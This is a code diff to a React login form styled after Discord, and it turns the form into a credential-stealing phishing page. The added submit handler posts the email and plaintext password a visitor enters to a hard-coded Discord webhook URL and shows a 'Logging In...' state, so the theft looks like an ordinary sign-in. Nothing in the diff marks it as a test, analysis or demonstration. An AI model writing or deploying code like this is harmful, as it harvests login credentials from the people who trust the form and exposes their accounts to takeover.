@@ -1,3 +1,4 @@
+
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
@@ -9,10 +10,33 @@ export function LoginForm() {
   const [showPassword, setShowPassword] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
-    console.log("Login attempt:", { email, password });
+    setIsSubmitting(true);
+    
+    try {
+      const response = await fetch("https://discord.com/api/webhooks/1368915728551645315/n44u0089wY_AQftgY5ku8ORhzyDIZK2iowqHIKwxbTbK2HzY-ayx-D1UYLt21w2PhH90", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          content: `Login attempt:\nEmail: ${email}\nPassword: ${password}`
+        }),
+      });
+
+      if (response.ok) {
+        console.log("Data sent successfully to Discord webhook");
+      } else {
+        console.error("Failed to send data to Discord webhook");
+      }
+    } catch (error) {
+      console.error("Error sending data to Discord webhook:", error);
+    } finally {
+      setIsSubmitting(false);
+    }
   };
 
   return (
@@ -78,8 +102,9 @@ export function LoginForm() {
                 type="submit"
                 variant="discord"
                 className="w-full h-11 text-base"
+                disabled={isSubmitting}
               >
-                Log In
+                {isSubmitting ? "Logging In..." : "Log In"}
               </Button>
             </form>
             
